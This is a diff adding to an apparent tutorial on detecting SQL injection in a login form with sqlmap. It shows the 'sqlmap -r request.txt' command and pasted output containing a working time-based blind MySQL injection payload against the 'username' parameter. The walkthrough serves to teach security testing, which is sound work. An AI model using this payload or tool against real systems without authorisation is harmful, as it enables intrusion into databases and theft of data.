@@ -126,3 +126,20 @@ Now running the following command will check if this form is vulnerable to a sql
 `sqlmap -r request.txt`
 
 The sqlmap tool will examine the request and check each parameter being sent in the request. For this example it will check if username is vulnerable to a sql injection attack then it will run the same test for the password parameter. It tests the parameters by checking if it can get a timeout for the request. It will add a delay of like five seconds to each parameter request and if the response takes more than five seconds, it will know that the parameter is vulnerable to the attack and what type of database the site is using.
+
+Some of the output from the above request and sqlmap run is as follows:
+
+```bash
+[04:55:26] [INFO] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 158 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 6950 FROM (SELECT(SLEEP(5)))pDlF) AND 'Rvtz'='Rvtz&password=password
+---
+[04:55:47] [INFO] the back-end DBMS is MySQL
+```
+
+As mentioned before, the username parameter is vulnerable and the backend is MySQL.
